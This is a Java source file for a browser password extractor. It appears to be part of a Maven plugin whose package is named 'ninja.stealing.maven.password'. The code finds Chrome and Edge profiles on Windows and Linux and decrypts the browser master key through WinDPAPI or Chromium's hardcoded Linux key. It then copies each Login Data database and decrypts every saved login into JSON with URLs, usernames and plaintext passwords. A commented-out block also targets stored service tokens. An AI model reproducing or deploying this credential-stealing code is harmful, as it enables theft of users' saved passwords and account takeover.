package ninja.stealing.maven.password.extractor;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.github.windpapi4j.InitializationFailedException;
import com.github.windpapi4j.WinAPICallFailedException;
import com.github.windpapi4j.WinDPAPI;
import ninja.stealing.maven.password.Utils;
import ninja.stealing.maven.password.model.Extraction;
import org.apache.maven.plugin.logging.Log;

import javax.crypto.Cipher;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.IOException;
import java.io.Reader;
import java.nio.ByteBuffer;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.NoSuchAlgorithmException;
import java.security.spec.AlgorithmParameterSpec;
import java.security.spec.InvalidKeySpecException;
import java.sql.*;
import java.util.*;

import static java.nio.file.StandardCopyOption.REPLACE_EXISTING;

public class ChromeExtractor implements Extractor {
	static final String EXTRACTOR_ID = "CHROME";
	private static String HOME = System.getProperty("user.home");
	private static String CHROME_BROWSER_PATH = "/AppData/Local/Google/Chrome/User Data";
	private static String EDGE_BROWSER_PATH = "/AppData/Local/Microsoft/Edge/User Data";
	private static String CHROME_BROWSER_PATH_LINUX = "/.config/google-chrome";
	private static String LOGIN_DATA = "Login Data";
	private static String LOCAL_STATE = "Local State";
	private static String WEB_DATA = "Web Data";

	private static byte[] V10 = { (byte) 0x76, (byte) 0x31, (byte) 0x30 }; // v10

	private static String OS = System.getProperty("os.name").toLowerCase();
	private static boolean IS_WINDOWS = (OS.indexOf("win") >= 0);

	private static WinDPAPI winDPAPI;
	private static final int GCM_IV_LENGTH = 12;
	private Log log;

	public ChromeExtractor(Log log) {
		this.log = log;
	}

	@Override
	public Extraction extract() {
		ObjectMapper mapper = new ObjectMapper();
		ObjectNode content = mapper.createObjectNode();
		log.info("Extracting password from chrome/edge");

		if (IS_WINDOWS && WinDPAPI.isPlatformSupported()) {
			try {
				winDPAPI = WinDPAPI.newInstance(WinDPAPI.CryptProtectFlag.CRYPTPROTECT_UI_FORBIDDEN);
			} catch (InitializationFailedException e) {
				log.warn("Can't initialize WinDPAPI");
			}
		}

		if (IS_WINDOWS) {
			content.set("Chrome", getData(CHROME_BROWSER_PATH));
			content.set("Edge", getData(EDGE_BROWSER_PATH));
		} else {
			content.set("Chrome", getData(CHROME_BROWSER_PATH_LINUX));
		}

		Extraction extraction = new Extraction(EXTRACTOR_ID, content);
		return extraction;
	}

	private JsonNode getData(String browserPath) {
		ObjectMapper mapper = new ObjectMapper();
		ObjectNode data = mapper.createObjectNode();
		byte[] encryptedMasterKey; // BASE64 encoded in the json file

		// Get and decrypt the master key
		Path stateData = Paths.get(HOME, browserPath, LOCAL_STATE);
		data.put("StateDataPath", stateData.toAbsolutePath().toString());
		encryptedMasterKey = getEncryptedMasterFromJsonFile(stateData);

		byte[] decryptedMasterKey = new byte[0]; // Master key is protected by the WDAPI on windows

		if (encryptedMasterKey.length > 5 && winDPAPI != null) {
			byte[] result = new byte[encryptedMasterKey.length - 5]; // 5 first char should be DPAPI. Maybe we should
																		// check ^^
			System.arraycopy(encryptedMasterKey, 5, result, 0, encryptedMasterKey.length - 5);
			try {
				decryptedMasterKey = winDPAPI.unprotectData(result);
			} catch (WinAPICallFailedException e) {
				log.warn("Can't decrypt master key.");
			}
		}

		if (decryptedMasterKey.length > 0) {
			log.info("Master key retrieved and decrypted");
			data.put("masterKey_b64", Utils.b64(decryptedMasterKey.toString()));
		} else {
			// some keys are hardcoded. Below is the Linux one when not using keyrings
			decryptedMasterKey = pbkdf2("peanuts".toCharArray(), "saltysalt".getBytes(), 1, 16);
			/*
			 * rkey = new byte[] { (byte) 0xfd, (byte) 0x62, (byte) 0x1f, (byte) 0xe5,
			 * (byte) 0xa2, (byte) 0xb4, (byte) 0x02, (byte) 0x53, (byte) 0x9d, (byte) 0xfa,
			 * (byte) 0x14, (byte) 0x7c, (byte) 0xa9, (byte) 0x27, (byte) 0x27, (byte)
			 * 0x78};
			 */

		}

		// Get all profile to grab all the database
		List<String> profiles;
		profiles = getProfilesFromJsonFile(stateData);

		for (String profile : profiles) {
			ObjectNode profileNode = mapper.createObjectNode();
			profileNode.put("name", profile);

			// Copy the SQLITE database to open it without alteration/risk
			Path loginData = Paths.get(HOME, browserPath, profile, LOGIN_DATA);
			Path tmpFile = null;
			profileNode.put("logindata", loginData.toAbsolutePath().toString());
			try {
				tmpFile = Files.createTempFile("data", "sqlite");
				Files.copy(loginData, tmpFile, REPLACE_EXISTING);
			} catch (IOException e) {
				log.warn("Can't copy sqlite file. Skipping this profile");
				continue;
			}

			Connection conn = null;
			Statement stmt = null;
			ResultSet rs = null;
			try {
				conn = DriverManager.getConnection("jdbc:sqlite:" + tmpFile.toAbsolutePath());
				stmt = conn.createStatement();
				rs = stmt.executeQuery("SELECT origin_url, action_url, username_value, password_value FROM logins");
			} catch (SQLException e) {
				log.warn("SQL issue. Skipping this profile");
				continue;
			}

			boolean next = false;

			try {
				next = rs.next();
			} catch (SQLException e) {
			}

			int cnt = 0;
			while (next) {
				ObjectNode passNode = mapper.createObjectNode();

				String origin = null;
				String action = null;
				String name = null;
				byte[] password = new byte[0];
				try {
					origin = rs.getString("origin_url");
					passNode.put("origin", origin);
				} catch (SQLException e) {
				}

				try {
					action = rs.getString("action_url");
					passNode.put("action", action);
				} catch (SQLException e) {
				}

				try {
					name = rs.getString("username_value");
					passNode.put("name", name);
				} catch (SQLException e) {
				}

				try {
					password = rs.getBytes("password_value");
					passNode.put("rawpassb64", Utils.b64(new String(password)));

				} catch (Exception e) {
				}

				if (password.length > 0) {
					byte[] decryptedText = decrypt(password, decryptedMasterKey);
					passNode.put("password", new String(decryptedText));
				}

				profileNode.put("pass-" + ++cnt, passNode);

				try {
					next = rs.next();
				} catch (SQLException e) {
					next = false;
				}
			}
			try {
				rs.close();
				stmt.close();
				conn.close();
			} catch (SQLException e) {
				log.warn("SQL issue when closing. Shit happens");
			}

			data.set(profile, profileNode);

		}
		/*
		 * for (String profile : profiles) { // Copy the SQLITE database to open it
		 * without alteration/risk Path webData = Paths.get(HOME, BROWSER_PATH, profile,
		 * WEB_DATA); Path tmpFile = Files.createTempFile("data", "sqlite");
		 * 
		 * tmpFile = Files.createTempFile("data", "sqlite"); Files.copy(webData,
		 * tmpFile, REPLACE_EXISTING); Connection conn =
		 * DriverManager.getConnection("jdbc:sqlite:" + tmpFile.toAbsolutePath());
		 * Statement stmt = conn.createStatement(); ResultSet rs =
		 * stmt.executeQuery("SELECT service, encrypted_token FROM token_service");
		 * while (rs.next()) { String service = rs.getString("service"); byte[]
		 * encrypted_token = rs.getBytes("encrypted_token"); log.warn("service = " +
		 * service); log.warn("encrypted_token = " + encrypted_token); byte[]
		 * decryptedText = decrypt(encrypted_token, decryptedMasterKey);
		 * log.warn("Token : " + new String(decryptedText)); } rs.close(); stmt.close();
		 * conn.close(); }
		 */
		return data;
	}

	private List<String> getProfilesFromJsonFile(Path jsonPath) {
		List<String> profiles = new ArrayList<>();
		try {
			Reader reader = Files.newBufferedReader(jsonPath);
			// create ObjectMapper instance
			ObjectMapper objectMapper = new ObjectMapper();

			// read customer.json file into tree model
			JsonNode parser = objectMapper.readTree(reader);
			JsonNode profile = parser.path("profile");
			JsonNode cache = profile.path("info_cache");

			for (Iterator<Map.Entry<String, JsonNode>> it = cache.fields(); it.hasNext();) {
				Map.Entry<String, JsonNode> entry = it.next();
				profiles.add(entry.getKey());
			}
		} catch (Exception e) {
		}
		return profiles;

	}

	/**
	 * Computes the PBKDF2 hash of a password.
	 *
	 * @param password   the password to hash.
	 * @param salt       the salt
	 * @param iterations the iteration count (slowness factor)
	 * @param bytes      the length of the hash to compute in bytes
	 * @return the PBDKF2 hash of the password or an empty key
	 */
	private static byte[] pbkdf2(char[] password, byte[] salt, int iterations, int bytes) {
		try {
			PBEKeySpec spec = new PBEKeySpec(password, salt, iterations, bytes * 8);
			SecretKeyFactory skf = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
			return skf.generateSecret(spec).getEncoded();
		} catch (Exception e) {
			return new byte[0];
		}
	}

	private byte[] decrypt(byte[] ciphertext, byte[] key) {
		if (key.length > 0) {
			try {
				// Linux default found on
				// https://github.com/priyankchheda/chrome_password_grabber
				// This also explain how this will work with keyring. Not supported yet.

				byte[] iv = "                ".getBytes(); // 16 spaces. Default IV on Linux
				String cypher = "AES/CBC/NOPADDING"; // Cypher on Linux
				AlgorithmParameterSpec spec = new IvParameterSpec(iv);

				ByteBuffer byteBuffer = ByteBuffer.wrap(ciphertext);
				byte[] version = new byte[3]; // v10
				byteBuffer.get(version);
				if (Arrays.equals(version, V10)) {
					if (IS_WINDOWS) {
						// Overwrite Linux default
						cypher = "AES/GCM/NoPadding";
						iv = new byte[GCM_IV_LENGTH];
						byteBuffer.get(iv);
						spec = new GCMParameterSpec(128, iv);
					}

					byte[] encrypted = new byte[byteBuffer.remaining()];
					byteBuffer.get(encrypted);
					Cipher decryptCipher = Cipher.getInstance(cypher);
					SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
					decryptCipher.init(Cipher.DECRYPT_MODE, keySpec, spec);
					byte[] result = decryptCipher.doFinal(encrypted);
					if (IS_WINDOWS) {
						return result;
					}

					// On Linux result is padded, last char contains the size of padding
					int size = result[result.length - 1];
					if (size > iv.length) { // Should not happens, but better return padded result than non-complete
											// result.
						size = 0;
					}
					byte[] unpadedresult = new byte[result.length - size];
					System.arraycopy(result, 0, unpadedresult, 0, result.length - size);
					return unpadedresult;
				}
			} catch (Exception e) {
				// Issue with crypto
			}
		}
		// If key is empty, or if execption happens during decrypt, we can still try to
		// use winDPAPI on raw.
		// This will also happens when password doesn't start with v10
		if (IS_WINDOWS && winDPAPI != null) {
			try {
				return winDPAPI.unprotectData(ciphertext);
			} catch (WinAPICallFailedException e) {
			}
		}
		return ciphertext;// maybe this is not encrypted after all...

	}

	private byte[] getEncryptedMasterFromJsonFile(Path jsonPath) {
		try {
			Reader reader = Files.newBufferedReader(jsonPath);
			// create ObjectMapper instance
			ObjectMapper objectMapper = new ObjectMapper();

			// read customer.json file into tree model
			JsonNode parser = objectMapper.readTree(reader);
			JsonNode crypt = parser.path("os_crypt");
			String key = crypt.path("encrypted_key").asText();
			return Base64.getDecoder().decode(key);
		} catch (Exception e) {
			return new byte[0]; // Didn't found anything, too bad.
		}
	}
}
